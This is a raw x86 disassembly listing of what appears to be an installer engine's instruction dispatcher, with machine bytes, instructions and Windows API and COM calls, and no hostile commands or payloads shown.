  401dd6:	83 e0 03             	and    $0x3,%eax
  401dd9:	83 e6 04             	and    $0x4,%esi
  401ddc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401ddf:	8b c1                	mov    %ecx,%eax
  401de1:	c1 e8 1f             	shr    $0x1f,%eax
  401de4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401de7:	8b c1                	mov    %ecx,%eax
  401de9:	c1 e8 1e             	shr    $0x1e,%eax
  401dec:	83 e0 01             	and    $0x1,%eax
  401def:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401df5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401df8:	74 09                	je     0x401e03
  401dfa:	6a 11                	push   $0x11
  401dfc:	e8 d1 0f 00 00       	call   0x402dd2
  401e01:	eb 04                	jmp    0x401e07
  401e03:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401e07:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401e0a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401e0d:	50                   	push   %eax
  401e0e:	ff 75 08             	push   0x8(%ebp)
  401e11:	ff 15 64 82 40 00    	call   *0x408264
  401e17:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401e1a:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401e1f:	50                   	push   %eax
  401e20:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401e23:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401e27:	50                   	push   %eax
  401e28:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401e2b:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e2f:	50                   	push   %eax
  401e30:	ff 75 c8             	push   -0x38(%ebp)
  401e33:	f7 de                	neg    %esi
  401e35:	ff 75 bc             	push   -0x44(%ebp)
  401e38:	1b f6                	sbb    %esi,%esi
  401e3a:	23 35 00 47 43 00    	and    0x434700,%esi
  401e40:	56                   	push   %esi
  401e41:	ff 15 44 82 40 00    	call   *0x408244
  401e47:	8b f0                	mov    %eax,%esi
  401e49:	56                   	push   %esi
  401e4a:	ff 75 c8             	push   -0x38(%ebp)
  401e4d:	68 72 01 00 00       	push   $0x172
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff 15 58 82 40 00    	call   *0x408258
  401e5b:	3b c3                	cmp    %ebx,%eax
  401e5d:	74 0c                	je     0x401e6b
  401e5f:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e62:	75 07                	jne    0x401e6b
  401e64:	50                   	push   %eax
  401e65:	ff 15 54 80 40 00    	call   *0x408054
  401e6b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e6e:	0f 8c e2 0d 00 00    	jl     0x402c56
  401e74:	56                   	push   %esi
  401e75:	e9 18 f7 ff ff       	jmp    0x401592
  401e7a:	ff 75 f8             	push   -0x8(%ebp)
  401e7d:	ff 15 48 82 40 00    	call   *0x408248
  401e83:	6a 02                	push   $0x2
  401e85:	8b f0                	mov    %eax,%esi
  401e87:	e8 24 0f 00 00       	call   0x402db0
  401e8c:	59                   	pop    %ecx
  401e8d:	8b d8                	mov    %eax,%ebx
  401e8f:	6a 48                	push   $0x48
  401e91:	6a 5a                	push   $0x5a
  401e93:	56                   	push   %esi
  401e94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e97:	ff 15 48 80 40 00    	call   *0x408048
  401e9d:	50                   	push   %eax
  401e9e:	53                   	push   %ebx
  401e9f:	ff 15 48 81 40 00    	call   *0x408148
  401ea5:	56                   	push   %esi
  401ea6:	ff 75 f8             	push   -0x8(%ebp)
  401ea9:	f7 d8                	neg    %eax
  401eab:	a3 f0 cd 40 00       	mov    %eax,0x40cdf0
  401eb0:	ff 15 4c 82 40 00    	call   *0x40824c
  401eb6:	6a 03                	push   $0x3
  401eb8:	e8 f3 0e 00 00       	call   0x402db0
  401ebd:	a3 00 ce 40 00       	mov    %eax,0x40ce00
  401ec2:	8a 45 e0             	mov    -0x20(%ebp),%al
  401ec5:	59                   	pop    %ecx
  401ec6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ec9:	ff 75 d4             	push   -0x2c(%ebp)
  401ecc:	8a c8                	mov    %al,%cl
  401ece:	80 e1 01             	and    $0x1,%cl
  401ed1:	c6 05 07 ce 40 00 01 	movb   $0x1,0x40ce07
  401ed8:	88 0d 04 ce 40 00    	mov    %cl,0x40ce04
  401ede:	8a c8                	mov    %al,%cl
  401ee0:	80 e1 02             	and    $0x2,%cl
  401ee3:	24 04                	and    $0x4,%al
  401ee5:	68 0c ce 40 00       	push   $0x40ce0c
  401eea:	88 0d 05 ce 40 00    	mov    %cl,0x40ce05
  401ef0:	a2 06 ce 40 00       	mov    %al,0x40ce06
  401ef5:	e8 f5 46 00 00       	call   0x4065ef
  401efa:	68 f0 cd 40 00       	push   $0x40cdf0
  401eff:	ff 15 5c 80 40 00    	call   *0x40805c
  401f05:	e9 5a 07 00 00       	jmp    0x402664
  401f0a:	53                   	push   %ebx
  401f0b:	e8 a0 0e 00 00       	call   0x402db0
  401f10:	6a 01                	push   $0x1
  401f12:	8b f0                	mov    %eax,%esi
  401f14:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f17:	e8 94 0e 00 00       	call   0x402db0
  401f1c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f1f:	59                   	pop    %ecx
  401f20:	59                   	pop    %ecx
  401f21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f24:	50                   	push   %eax
  401f25:	56                   	push   %esi
  401f26:	75 0b                	jne    0x401f33
  401f28:	ff 15 28 82 40 00    	call   *0x408228
  401f2e:	e9 23 0d 00 00       	jmp    0x402c56
  401f33:	ff 15 50 82 40 00    	call   *0x408250
  401f39:	e9 18 0d 00 00       	jmp    0x402c56
  401f3e:	53                   	push   %ebx
  401f3f:	e8 8e 0e 00 00       	call   0x402dd2
  401f44:	6a 31                	push   $0x31
  401f46:	8b f0                	mov    %eax,%esi
  401f48:	e8 85 0e 00 00       	call   0x402dd2
  401f4d:	6a 22                	push   $0x22
  401f4f:	8b d8                	mov    %eax,%ebx
  401f51:	e8 7c 0e 00 00       	call   0x402dd2
  401f56:	6a 15                	push   $0x15
  401f58:	8b f8                	mov    %eax,%edi
  401f5a:	e8 73 0e 00 00       	call   0x402dd2
  401f5f:	6a ec                	push   $0xffffffec
  401f61:	e8 bd f4 ff ff       	call   0x401423
  401f66:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f69:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f72:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f78:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f7b:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f7e:	66 8b 06             	mov    (%esi),%ax
  401f81:	66 f7 d8             	neg    %ax
  401f84:	1b c0                	sbb    %eax,%eax
  401f86:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f89:	23 c6                	and    %esi,%eax
  401f8b:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f8e:	66 8b 07             	mov    (%edi),%ax
  401f91:	66 f7 d8             	neg    %ax
  401f94:	1b c0                	sbb    %eax,%eax
  401f96:	c7 45 8c 00 00 44 00 	movl   $0x440000,-0x74(%ebp)
  401f9d:	23 c7                	and    %edi,%eax
  401f9f:	89 45 88             	mov    %eax,-0x78(%ebp)
  401fa2:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401fa8:	50                   	push   %eax
  401fa9:	e8 2a 3c 00 00       	call   0x405bd8
  401fae:	85 c0                	test   %eax,%eax
  401fb0:	0f 84 a4 09 00 00    	je     0x40295a
  401fb6:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401fbd:	0f 84 93 0c 00 00    	je     0x402c56
  401fc3:	ff 75 ac             	push   -0x54(%ebp)
  401fc6:	e8 86 4a 00 00       	call   0x406a51
  401fcb:	ff 75 ac             	push   -0x54(%ebp)
  401fce:	eb 47                	jmp    0x402017
  401fd0:	53                   	push   %ebx
  401fd1:	e8 fc 0d 00 00       	call   0x402dd2
  401fd6:	8b f0                	mov    %eax,%esi
  401fd8:	56                   	push   %esi
  401fd9:	6a eb                	push   $0xffffffeb
  401fdb:	e8 57 36 00 00       	call   0x405637
  401fe0:	56                   	push   %esi
  401fe1:	e8 af 3b 00 00       	call   0x405b95
  401fe6:	8b f0                	mov    %eax,%esi
  401fe8:	3b f3                	cmp    %ebx,%esi
  401fea:	0f 84 6a 09 00 00    	je     0x40295a
  401ff0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ff3:	74 21                	je     0x402016
  401ff5:	56                   	push   %esi
  401ff6:	e8 56 4a 00 00       	call   0x406a51
  401ffb:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401ffe:	7c 0b                	jl     0x40200b
  402000:	50                   	push   %eax
  402001:	ff 75 f4             	push   -0xc(%ebp)
  402004:	e8 f0 44 00 00       	call   0x4064f9
  402009:	eb 0b                	jmp    0x402016
  40200b:	3b c3                	cmp    %ebx,%eax
  40200d:	74 07                	je     0x402016
  40200f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402016:	56                   	push   %esi
  402017:	ff 15 fc 80 40 00    	call   *0x4080fc
  40201d:	e9 34 0c 00 00       	jmp    0x402c56
  402022:	6a 02                	push   $0x2
  402024:	e8 a9 0d 00 00       	call   0x402dd2
  402029:	50                   	push   %eax
  40202a:	e8 e0 48 00 00       	call   0x40690f
  40202f:	8b f0                	mov    %eax,%esi
  402031:	3b f3                	cmp    %ebx,%esi
  402033:	74 13                	je     0x402048
  402035:	ff 76 14             	push   0x14(%esi)
  402038:	ff 75 f4             	push   -0xc(%ebp)
  40203b:	e8 b9 44 00 00       	call   0x4064f9
  402040:	ff 76 18             	push   0x18(%esi)
  402043:	e9 4a f5 ff ff       	jmp    0x401592
  402048:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40204b:	66 89 1f             	mov    %bx,(%edi)
  40204e:	66 89 18             	mov    %bx,(%eax)
  402051:	e9 04 09 00 00       	jmp    0x40295a
  402056:	6a ee                	push   $0xffffffee
  402058:	e8 75 0d 00 00       	call   0x402dd2
  40205d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402060:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402063:	51                   	push   %ecx
  402064:	50                   	push   %eax
  402065:	6a 0b                	push   $0xb
  402067:	e8 3a 49 00 00       	call   0x4069a6
  40206c:	ff d0                	call   *%eax
  40206e:	8b f0                	mov    %eax,%esi
  402070:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402073:	66 89 1f             	mov    %bx,(%edi)
  402076:	3b f3                	cmp    %ebx,%esi
  402078:	66 89 18             	mov    %bx,(%eax)
  40207b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402082:	0f 84 ce 0b 00 00    	je     0x402c56
  402088:	56                   	push   %esi
  402089:	6a 40                	push   $0x40
  40208b:	ff 15 10 81 40 00    	call   *0x408110
  402091:	3b c3                	cmp    %ebx,%eax
  402093:	89 45 08             	mov    %eax,0x8(%ebp)
  402096:	0f 84 ba 0b 00 00    	je     0x402c56
  40209c:	6a 0c                	push   $0xc
  40209e:	e8 03 49 00 00       	call   0x4069a6
  4020a3:	6a 0d                	push   $0xd
  4020a5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4020a8:	e8 f9 48 00 00       	call   0x4069a6
  4020ad:	ff 75 08             	push   0x8(%ebp)
  4020b0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4020b3:	56                   	push   %esi
  4020b4:	53                   	push   %ebx
  4020b5:	ff 75 c8             	push   -0x38(%ebp)
  4020b8:	ff 55 c0             	call   *-0x40(%ebp)
  4020bb:	85 c0                	test   %eax,%eax
  4020bd:	74 3c                	je     0x4020fb
  4020bf:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4020c2:	50                   	push   %eax
  4020c3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4020c6:	50                   	push   %eax
  4020c7:	68 14 a0 40 00       	push   $0x40a014
  4020cc:	ff 75 08             	push   0x8(%ebp)
  4020cf:	ff 55 e8             	call   *-0x18(%ebp)
  4020d2:	85 c0                	test   %eax,%eax
  4020d4:	74 25                	je     0x4020fb
  4020d6:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020d9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020dc:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020e0:	57                   	push   %edi
  4020e1:	e8 13 44 00 00       	call   0x4064f9
  4020e6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020e9:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4020ec:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020f0:	ff 75 f4             	push   -0xc(%ebp)
  4020f3:	e8 01 44 00 00       	call   0x4064f9
  4020f8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020fb:	ff 75 08             	push   0x8(%ebp)
  4020fe:	e9 34 fb ff ff       	jmp    0x401c37
  402103:	39 1d c0 47 43 00    	cmp    %ebx,0x4347c0
  402109:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402110:	0f 8c b9 00 00 00    	jl     0x4021cf
  402116:	6a f0                	push   $0xfffffff0
  402118:	e8 b5 0c 00 00       	call   0x402dd2
  40211d:	6a 01                	push   $0x1
  40211f:	8b f8                	mov    %eax,%edi
  402121:	e8 ac 0c 00 00       	call   0x402dd2
  402126:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402129:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40212c:	74 0e                	je     0x40213c
  40212e:	57                   	push   %edi
  40212f:	ff 15 14 81 40 00    	call   *0x408114
  402135:	3b c3                	cmp    %ebx,%eax
  402137:	89 45 08             	mov    %eax,0x8(%ebp)
  40213a:	75 11                	jne    0x40214d
  40213c:	6a 08                	push   $0x8
  40213e:	53                   	push   %ebx
  40213f:	57                   	push   %edi
  402140:	ff 15 18 81 40 00    	call   *0x408118
  402146:	3b c3                	cmp    %ebx,%eax
  402148:	89 45 08             	mov    %eax,0x8(%ebp)
  40214b:	74 7b                	je     0x4021c8
  40214d:	ff 75 bc             	push   -0x44(%ebp)
  402150:	ff 75 08             	push   0x8(%ebp)
  402153:	e8 bd 48 00 00       	call   0x406a15
  402158:	8b f8                	mov    %eax,%edi
  40215a:	3b fb                	cmp    %ebx,%edi
  40215c:	74 39                	je     0x402197
  40215e:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402161:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402164:	74 17                	je     0x40217d
  402166:	ff 75 d8             	push   -0x28(%ebp)
  402169:	e8 b5 f2 ff ff       	call   0x401423
  40216e:	ff d7                	call   *%edi
  402170:	85 c0                	test   %eax,%eax
  402172:	74 2d                	je     0x4021a1
  402174:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40217b:	eb 24                	jmp    0x4021a1
  40217d:	68 00 a0 40 00       	push   $0x40a000
  402182:	68 50 ce 40 00       	push   $0x40ce50
  402187:	56                   	push   %esi
  402188:	68 00 04 00 00       	push   $0x400
  40218d:	ff 75 f8             	push   -0x8(%ebp)
  402190:	ff d7                	call   *%edi
  402192:	83 c4 14             	add    $0x14,%esp
  402195:	eb 0a                	jmp    0x4021a1
  402197:	ff 75 bc             	push   -0x44(%ebp)
  40219a:	6a f7                	push   $0xfffffff7
  40219c:	e8 96 34 00 00       	call   0x405637
  4021a1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4021a4:	0f 85 ac 0a 00 00    	jne    0x402c56
  4021aa:	ff 75 08             	push   0x8(%ebp)
  4021ad:	e8 72 1a 00 00       	call   0x403c24
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	0f 84 9c 0a 00 00    	je     0x402c56
  4021ba:	ff 75 08             	push   0x8(%ebp)
  4021bd:	ff 15 1c 81 40 00    	call   *0x40811c
  4021c3:	e9 8e 0a 00 00       	jmp    0x402c56
  4021c8:	6a f6                	push   $0xfffffff6
  4021ca:	e9 4e 01 00 00       	jmp    0x40231d
  4021cf:	6a e7                	push   $0xffffffe7
  4021d1:	e9 47 01 00 00       	jmp    0x40231d
  4021d6:	6a f0                	push   $0xfffffff0
  4021d8:	e8 f5 0b 00 00       	call   0x402dd2
  4021dd:	6a df                	push   $0xffffffdf
  4021df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021e2:	e8 eb 0b 00 00       	call   0x402dd2
  4021e7:	6a 02                	push   $0x2
  4021e9:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021ec:	e8 e1 0b 00 00       	call   0x402dd2
  4021f1:	6a cd                	push   $0xffffffcd
  4021f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021f6:	e8 d7 0b 00 00       	call   0x402dd2
  4021fb:	6a 45                	push   $0x45
  4021fd:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402200:	e8 cd 0b 00 00       	call   0x402dd2
  402205:	ff 75 bc             	push   -0x44(%ebp)
  402208:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40220b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40220e:	8b c8                	mov    %eax,%ecx
  402210:	8b f8                	mov    %eax,%edi
  402212:	8b f0                	mov    %eax,%esi
  402214:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40221a:	c1 f8 10             	sar    $0x10,%eax
  40221d:	c1 fe 0c             	sar    $0xc,%esi
  402220:	25 ff ff 00 00       	and    $0xffff,%eax
  402225:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402228:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40222e:	83 e6 07             	and    $0x7,%esi
  402231:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402234:	e8 bf 3c 00 00       	call   0x405ef8
  402239:	85 c0                	test   %eax,%eax
  40223b:	75 07                	jne    0x402244
  40223d:	6a 21                	push   $0x21
  40223f:	e8 8e 0b 00 00       	call   0x402dd2
  402244:	8d 45 08             	lea    0x8(%ebp),%eax
  402247:	50                   	push   %eax
  402248:	68 d8 85 40 00       	push   $0x4085d8
  40224d:	6a 01                	push   $0x1
  40224f:	53                   	push   %ebx
  402250:	68 e8 85 40 00       	push   $0x4085e8
  402255:	ff 15 90 82 40 00    	call   *0x408290
  40225b:	3b c3                	cmp    %ebx,%eax
  40225d:	0f 8c b1 00 00 00    	jl     0x402314
  402263:	8b 45 08             	mov    0x8(%ebp),%eax
  402266:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402269:	52                   	push   %edx
  40226a:	68 f8 85 40 00       	push   $0x4085f8
  40226f:	8b 08                	mov    (%eax),%ecx
  402271:	50                   	push   %eax
  402272:	ff 11                	call   *(%ecx)
  402274:	3b c3                	cmp    %ebx,%eax
  402276:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402279:	0f 8c 87 00 00 00    	jl     0x402306
  40227f:	8b 45 08             	mov    0x8(%ebp),%eax
  402282:	ff 75 bc             	push   -0x44(%ebp)
  402285:	8b 08                	mov    (%eax),%ecx
  402287:	50                   	push   %eax
  402288:	ff 51 50             	call   *0x50(%ecx)
  40228b:	3b fb                	cmp    %ebx,%edi
  40228d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402290:	75 0e                	jne    0x4022a0
  402292:	8b 45 08             	mov    0x8(%ebp),%eax
  402295:	68 00 00 44 00       	push   $0x440000
  40229a:	50                   	push   %eax
  40229b:	8b 08                	mov    (%eax),%ecx
  40229d:	ff 51 24             	call   *0x24(%ecx)
  4022a0:	3b f3                	cmp    %ebx,%esi
  4022a2:	74 0a                	je     0x4022ae
  4022a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a7:	56                   	push   %esi
  4022a8:	50                   	push   %eax
  4022a9:	8b 08                	mov    (%eax),%ecx
  4022ab:	ff 51 3c             	call   *0x3c(%ecx)
  4022ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b1:	ff 75 c0             	push   -0x40(%ebp)
  4022b4:	8b 08                	mov    (%eax),%ecx
  4022b6:	50                   	push   %eax
  4022b7:	ff 51 34             	call   *0x34(%ecx)
  4022ba:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4022bd:	66 39 19             	cmp    %bx,(%ecx)
  4022c0:	74 0d                	je     0x4022cf
  4022c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c5:	ff 75 b0             	push   -0x50(%ebp)
  4022c8:	8b 10                	mov    (%eax),%edx
  4022ca:	51                   	push   %ecx
  4022cb:	50                   	push   %eax
  4022cc:	ff 52 44             	call   *0x44(%edx)
  4022cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d2:	ff 75 f8             	push   -0x8(%ebp)
  4022d5:	8b 08                	mov    (%eax),%ecx
  4022d7:	50                   	push   %eax
  4022d8:	ff 51 2c             	call   *0x2c(%ecx)
  4022db:	8b 45 08             	mov    0x8(%ebp),%eax
  4022de:	ff 75 f4             	push   -0xc(%ebp)
  4022e1:	8b 08                	mov    (%eax),%ecx
  4022e3:	50                   	push   %eax
  4022e4:	ff 51 1c             	call   *0x1c(%ecx)
  4022e7:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022ea:	7c 11                	jl     0x4022fd
  4022ec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022ef:	6a 01                	push   $0x1
  4022f1:	ff 75 f0             	push   -0x10(%ebp)
  4022f4:	8b 08                	mov    (%eax),%ecx
  4022f6:	50                   	push   %eax
  4022f7:	ff 51 18             	call   *0x18(%ecx)
  4022fa:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022fd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402300:	50                   	push   %eax
  402301:	8b 08                	mov    (%eax),%ecx
  402303:	ff 51 08             	call   *0x8(%ecx)
  402306:	8b 45 08             	mov    0x8(%ebp),%eax
  402309:	50                   	push   %eax
  40230a:	8b 08                	mov    (%eax),%ecx
  40230c:	ff 51 08             	call   *0x8(%ecx)
  40230f:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402312:	7d 13                	jge    0x402327
  402314:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40231b:	6a f0                	push   $0xfffffff0
  40231d:	e8 01 f1 ff ff       	call   0x401423
  402322:	e9 2f 09 00 00       	jmp    0x402c56
  402327:	6a f4                	push   $0xfffffff4
  402329:	eb f2                	jmp    0x40231d
  40232b:	53                   	push   %ebx
  40232c:	e8 a1 0a 00 00       	call   0x402dd2
  402331:	6a 11                	push   $0x11
  402333:	8b f0                	mov    %eax,%esi
  402335:	e8 98 0a 00 00       	call   0x402dd2
  40233a:	6a 23                	push   $0x23
  40233c:	8b f8                	mov    %eax,%edi
  40233e:	e8 8f 0a 00 00       	call   0x402dd2
  402343:	56                   	push   %esi
  402344:	89 45 08             	mov    %eax,0x8(%ebp)
  402347:	e8 c3 45 00 00       	call   0x40690f
  40234c:	85 c0                	test   %eax,%eax
  40234e:	75 0d                	jne    0x40235d
  402350:	53                   	push   %ebx
  402351:	6a f9                	push   $0xfffffff9
  402353:	e8 df 32 00 00       	call   0x405637
  402358:	e9 fd 05 00 00       	jmp    0x40295a
  40235d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402360:	56                   	push   %esi
  402361:	89 45 90             	mov    %eax,-0x70(%ebp)
  402364:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  40236b:	e8 58 42 00 00       	call   0x4065c8
  402370:	57                   	push   %edi
  402371:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402376:	e8 4d 42 00 00       	call   0x4065c8
  40237b:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  402380:	8b 45 08             	mov    0x8(%ebp),%eax
  402383:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402387:	50                   	push   %eax
  402388:	53                   	push   %ebx
  402389:	89 75 98             	mov    %esi,-0x68(%ebp)
  40238c:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40238f:	89 45 aa             	mov    %eax,-0x56(%ebp)
  402392:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  402396:	e8 9c 32 00 00       	call   0x405637
  40239b:	8d 45 90             	lea    -0x70(%ebp),%eax
  40239e:	50                   	push   %eax
  40239f:	ff 15 80 81 40 00    	call   *0x408180
  4023a5:	85 c0                	test   %eax,%eax
  4023a7:	0f 84 a9 08 00 00    	je     0x402c56
  4023ad:	eb a1                	jmp    0x402350
  4023af:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023b4:	74 1d                	je     0x4023d3
  4023b6:	68 10 00 20 00       	push   $0x200010
  4023bb:	6a e8                	push   $0xffffffe8
  4023bd:	53                   	push   %ebx
  4023be:	e8 2c 42 00 00       	call   0x4065ef
  4023c3:	50                   	push   %eax
  4023c4:	e8 49 38 00 00       	call   0x405c12
  4023c9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023ce:	e9 8e 08 00 00       	jmp    0x402c61
  4023d3:	ff 05 94 47 43 00    	incl   0x434794
  4023d9:	e9 78 08 00 00       	jmp    0x402c56
  4023de:	33 f6                	xor    %esi,%esi
  4023e0:	33 ff                	xor    %edi,%edi
  4023e2:	3b c3                	cmp    %ebx,%eax
  4023e4:	74 08                	je     0x4023ee
  4023e6:	53                   	push   %ebx
  4023e7:	e8 e6 09 00 00       	call   0x402dd2
  4023ec:	8b f0                	mov    %eax,%esi
  4023ee:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023f1:	74 09                	je     0x4023fc
  4023f3:	6a 11                	push   $0x11
  4023f5:	e8 d8 09 00 00       	call   0x402dd2
  4023fa:	8b f8                	mov    %eax,%edi
  4023fc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023ff:	74 09                	je     0x40240a
  402401:	6a 22                	push   $0x22
  402403:	e8 ca 09 00 00       	call   0x402dd2
  402408:	8b d8                	mov    %eax,%ebx
  40240a:	6a cd                	push   $0xffffffcd
  40240c:	e8 c1 09 00 00       	call   0x402dd2
  402411:	50                   	push   %eax
  402412:	53                   	push   %ebx
  402413:	57                   	push   %edi
  402414:	56                   	push   %esi
  402415:	ff 15 20 81 40 00    	call   *0x408120
  40241b:	e9 b9 f1 ff ff       	jmp    0x4015d9
  402420:	a1 10 a0 40 00       	mov    0x40a010,%eax
  402425:	6a 01                	push   $0x1
  402427:	89 45 08             	mov    %eax,0x8(%ebp)
  40242a:	e8 a3 09 00 00       	call   0x402dd2
  40242f:	6a 12                	push   $0x12
  402431:	8b f0                	mov    %eax,%esi
  402433:	e8 9a 09 00 00       	call   0x402dd2
  402438:	6a dd                	push   $0xffffffdd
  40243a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40243d:	e8 90 09 00 00       	call   0x402dd2
  402442:	50                   	push   %eax
  402443:	68 ff 03 00 00       	push   $0x3ff
  402448:	8d 45 08             	lea    0x8(%ebp),%eax
  40244b:	57                   	push   %edi
  40244c:	50                   	push   %eax
  40244d:	ff 75 f0             	push   -0x10(%ebp)
  402450:	56                   	push   %esi
  402451:	ff 15 24 81 40 00    	call   *0x408124
  402457:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  40245b:	e9 1d f3 ff ff       	jmp    0x40177d
  402460:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402463:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402466:	75 2b                	jne    0x402493
  402468:	6a 02                	push   $0x2
  40246a:	e8 a3 09 00 00       	call   0x402e12
  40246f:	8b f0                	mov    %eax,%esi
  402471:	3b f3                	cmp    %ebx,%esi
  402473:	0f 84 e1 04 00 00    	je     0x40295a
  402479:	6a 33                	push   $0x33
  40247b:	e8 52 09 00 00       	call   0x402dd2
  402480:	50                   	push   %eax
  402481:	56                   	push   %esi
  402482:	ff 15 14 80 40 00    	call   *0x408014
  402488:	56                   	push   %esi
  402489:	8b f8                	mov    %eax,%edi
  40248b:	ff 15 10 80 40 00    	call   *0x408010
  402491:	eb 16                	jmp    0x4024a9
  402493:	6a 22                	push   $0x22
  402495:	e8 38 09 00 00       	call   0x402dd2
  40249a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40249d:	d1 f9                	sar    $1,%ecx
  40249f:	51                   	push   %ecx
  4024a0:	50                   	push   %eax
  4024a1:	56                   	push   %esi
  4024a2:	e8 e9 09 00 00       	call   0x402e90
  4024a7:	8b f8                	mov    %eax,%edi
  4024a9:	3b fb                	cmp    %ebx,%edi
  4024ab:	0f 84 a5 07 00 00    	je     0x402c56
  4024b1:	e9 a4 04 00 00       	jmp    0x40295a
  4024b6:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4024b9:	8b f8                	mov    %eax,%edi
  4024bb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4024be:	6a 02                	push   $0x2
  4024c0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024c3:	e8 0a 09 00 00       	call   0x402dd2
  4024c8:	6a 11                	push   $0x11
  4024ca:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4024cd:	e8 00 09 00 00       	call   0x402dd2
  4024d2:	6a 02                	push   $0x2
  4024d4:	50                   	push   %eax
  4024d5:	57                   	push   %edi
  4024d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024dd:	e8 80 09 00 00       	call   0x402e62
  4024e2:	3b c3                	cmp    %ebx,%eax
  4024e4:	89 45 08             	mov    %eax,0x8(%ebp)
